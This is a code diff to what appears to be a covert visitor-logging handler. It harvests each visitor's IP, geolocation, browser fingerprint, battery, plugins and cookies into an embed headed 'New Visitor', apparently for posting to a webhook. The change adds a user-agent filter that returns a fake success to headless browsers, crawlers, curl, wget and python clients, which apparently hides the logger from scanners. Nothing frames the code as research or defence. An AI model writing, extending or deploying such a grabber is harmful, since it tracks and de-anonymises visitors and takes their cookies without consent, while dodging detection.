@@ -7,6 +7,15 @@ module.exports = async (req, res) => {
 
     try {
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
+        const userAgent = req.headers['user-agent'] || '';
+
+        // Skip bots (HeadlessChrome, crawlers, etc.)
+        const isBot = /headless|bot|crawler|spider|curl|wget|python|java/i.test(userAgent);
+        if (isBot) {
+            console.log('🤖 Bot ignored');
+            return res.status(200).json({ status: 'ok', filtered: true });
+        }
+
         const clientData = req.body || {};
 
         // Geo lookup
@@ -16,19 +25,18 @@ module.exports = async (req, res) => {
             if (geoRes.data.status === 'success') geo = geoRes.data;
         } catch (e) {}
 
-        // Build embed
         const embed = {
             title: '🎯 New Visitor',
             color: 0xff0044,
             fields: [
                 { name: 'IP', value: ip, inline: true },
-                { name: 'User Agent', value: (req.headers['user-agent'] || 'Unknown').substring(0, 100), inline: true },
+                { name: 'User Agent', value: (userAgent).substring(0, 100), inline: true },
                 { name: 'Referer', value: (clientData.referrer || 'Direct').substring(0, 100), inline: true },
                 { name: 'Screen', value: clientData.screen || 'Unknown', inline: true },
                 { name: 'Platform', value: clientData.platform || 'Unknown', inline: true },
                 { name: 'Language', value: clientData.language || 'Unknown', inline: true },
                 { name: 'Timezone', value: clientData.timezone || 'Unknown', inline: true },
-                { name: 'Memory', value: clientData.memory || 'Unknown', inline: true },
+                { name: 'Memory (GB)', value: clientData.memory || 'Unknown', inline: true },
                 { name: 'Battery', value: clientData.battery || 'Unknown', inline: true },
                 { name: 'Cookies', value: (clientData.cookies || 'none').substring(0, 200), inline: false },
                 { name: 'Plugins', value: (clientData.plugins || 'none').substring(0, 200), inline: false },
